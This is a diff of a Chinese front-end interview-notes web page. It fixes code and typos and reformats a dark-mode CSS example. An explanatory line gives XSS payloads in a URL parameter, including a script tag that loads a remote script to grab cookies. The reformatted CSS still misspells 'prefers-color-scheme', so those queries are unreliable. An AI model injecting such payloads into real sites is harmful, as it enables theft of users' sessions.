@@ -4656,7 +4656,7 @@
 <span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">head</span><span class="p">.</span><span class="nx">next</span><span class="p">.</span><span class="nx">next</span><span class="p">;</span>
 <span class="k">while</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">a</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">next</span><span class="p">;</span>
-  <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">next</span><span class="p">;</span><span class="nx">next</span><span class="p">;</span>
+  <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">next</span><span class="p">.</span><span class="nx">next</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="c1">// 需要预处理next下一个节点是否存在等</span>
 </code></pre></div>
@@ -4684,7 +4684,7 @@
 </code></pre></div>
 <h4 id="4-web">4 常见的web攻击<a class="headerlink" href="#4-web" title="Permanent link">&para;</a></h4>
 <ul>
-<li>XSS：cross site scripting 跨站脚本共计；有漏洞的网站运行攻击者的脚本命令。可以利用虚假表单获取个人信息。利用 JS 获取用户的cookie值。被害者在不知情的情况下，帮助攻击者发送恶意请求（显示伪造的文章或者图片，显示伪造的网页登录情况）。例子：被攻击的A网站中，通过URL传值，获取登录用户名。那么攻击者在URL中设置自己的攻击脚本，获取cookie等信息。<code>localhost:3000/?id=&lt;script&gt;alert('1')&lt;/script&gt;</code> 进一步执行远程脚本 <code>localhost:3000/?id=&lt;script src="http://www.baidu.com/index.js"&gt;&lt;/script&gt;</code> 获取信息。</li>
+<li>XSS：cross site scripting 跨站脚本攻击；有漏洞的网站运行攻击者的脚本命令。可以利用虚假表单获取个人信息。利用 JS 获取用户的cookie值。被害者在不知情的情况下，帮助攻击者发送恶意请求（显示伪造的文章或者图片，显示伪造的网页登录情况）。例子：被攻击的A网站中，通过URL传值，获取登录用户名。那么攻击者在URL中设置自己的攻击脚本，获取cookie等信息。<code>localhost:3000/?id=&lt;script&gt;alert('1')&lt;/script&gt;</code> 进一步执行远程脚本 <code>localhost:3000/?id=&lt;script src="http://www.baidu.com/index.js"&gt;&lt;/script&gt;</code> 获取信息。</li>
 <li>CSRF、点击劫持、OS注入、请求劫持、DDOS</li>
 <li>SQL注入：用户在提交数据时（用户名密码），可能把非法的用户名（例如某一段SQL语句）提交到服务器。服务器在查找数据库时，<code>select * from db where username is XXX</code> 把非法的SQL执行，造成数据损失等。避免方法：永远不要相信用户的输入；对用户的输入进行校验和转换；不要使用超级管理员权限执行某些操作等。</li>
 </ul>
@@ -4709,8 +4709,8 @@
 <span class="c1">// 停止动画</span>
 <span class="nx">clearInterval</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">timer</span><span class="p">);</span>
 </code></pre></div>
-<p>这样写，JS 实际执行的间隔，和浏览器渲染重拍的时间不一定完全吻合，性能可能不好。</p>
-<p>所以我们引入了 rquuestAnimationFrame，这样可以让JS执行的时间和浏览器渲染的时间一致，性能增加。</p>
+<p>这样写，JS 实际执行的间隔，和浏览器渲染重排的时间不一定完全吻合，性能可能不好。</p>
+<p>所以我们引入了 requestAnimationFrame，这样可以让JS执行的时间和浏览器渲染的时间一致，性能增加。</p>
 <div class="highlight"><pre><span></span><code><span class="kd">function</span> <span class="nx">fn</span><span class="p">()</span> <span class="p">{</span>
   <span class="c1">// 动画逻辑 this.div.left = this.div.left + 10</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">time</span> <span class="o">&lt;</span> <span class="mf">2000</span><span class="p">)</span> <span class="p">{</span>
@@ -4799,39 +4799,37 @@
 <p>扩展运算符可以复制数组或者对象。如果数组的每一项是引用类型，那么不会深复制，只会复制指向数组的指针。所以不能使用扩展运算符对数组或者对象进行深拷贝（深拷贝最好使用 deepcopy）。</p>
 <h4 id="14-html">14 HTML 设置夜间模式<a class="headerlink" href="#14-html" title="Permanent link">&para;</a></h4>
 <p>可以直接使用CSS媒体查询 perfers-color-scheme 判断当前用户是否将系统的主体色设置成暗色或者亮色。属性：light dart no-perference 偏好。</p>
-<p><sub>~</sub> css
-@media (perfers-color-scheme: light) {
-  body {
-    background-color: white;
-  }
-}
-@media (perfers-color-scheme: dark) {
-  body {
-    background-color: black;
-  }
-}
-@media (perfers-color-scheme: no-perference) {
-  body {
-    background-color: white;
-  }
-}
-<div class="highlight"><pre><span></span><code>也可以使用 JS 进行媒体查询，然后设置全局属性，通过类名更改样式
+<div class="highlight"><pre><span></span><code><span class="p">@</span><span class="k">media</span> <span class="o">(</span><span class="nt">perfers-color-scheme</span><span class="o">:</span> <span class="nt">light</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">body</span> <span class="p">{</span>
+    <span class="k">background-color</span><span class="p">:</span> <span class="kc">white</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="p">@</span><span class="k">media</span> <span class="o">(</span><span class="nt">perfers-color-scheme</span><span class="o">:</span> <span class="nt">dark</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">body</span> <span class="p">{</span>
+    <span class="k">background-color</span><span class="p">:</span> <span class="kc">black</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="p">@</span><span class="k">media</span> <span class="o">(</span><span class="nt">perfers-color-scheme</span><span class="o">:</span> <span class="nt">no-perference</span><span class="o">)</span> <span class="p">{</span>
+  <span class="nt">body</span> <span class="p">{</span>
+    <span class="k">background-color</span><span class="p">:</span> <span class="kc">white</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>也可以使用 JS 进行媒体查询，然后设置全局属性，通过类名更改样式</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span> <span class="nx">mode</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">matchMedia</span> <span class="o">&amp;&amp;</span> <span class="nb">window</span><span class="p">.</span><span class="nx">matchMedia</span><span class="p">(</span><span class="s1">&#39;(prefers-color-scheme: dark)&#39;</span><span class="p">)</span>
 
-~~~js
-const mode = window.matchMedia &amp;&amp; window.matchMedia(&#39;(prefers-color-scheme: dark)&#39;)
-
-if (mode &amp;&amp; mode.matches) { 
-  document.body.classList.add(&#39;dark&#39;); 
-} 
-// 监听主题切换事件 
-mode &amp;&amp; mode.addEventListener(&#39;change&#39;, e =&gt; { 
-  if (e.matches) { 
-    document.body.classList.add(&#39;dark-bg&#39;); 
-  } else { 
-    document.body.classList.remove(&#39;dark-bg&#39;);  
-  } 
-});
-</code></pre></div></p>
+<span class="k">if</span> <span class="p">(</span><span class="nx">mode</span> <span class="o">&amp;&amp;</span> <span class="nx">mode</span><span class="p">.</span><span class="nx">matches</span><span class="p">)</span> <span class="p">{</span> 
+  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">&#39;dark&#39;</span><span class="p">);</span> 
+<span class="p">}</span> 
+<span class="c1">// 监听主题切换事件 </span>
+<span class="nx">mode</span> <span class="o">&amp;&amp;</span> <span class="nx">mode</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;change&#39;</span><span class="p">,</span> <span class="nx">e</span> <span class="p">=&gt;</span> <span class="p">{</span> 
+  <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">matches</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">&#39;dark-bg&#39;</span><span class="p">);</span> 
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">&#39;dark-bg&#39;</span><span class="p">);</span>  
+  <span class="p">}</span> 
+<span class="p">});</span>
+</code></pre></div>
 <p>参考：<a href="https://www.zhihu.com/question/437949548">https://www.zhihu.com/question/437949548</a></p>
 <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@media/prefers-color-scheme">https://developer.mozilla.org/zh-CN/docs/Web/CSS/@media/prefers-color-scheme</a></p>
 <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/matchMedia">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/matchMedia</a></p>
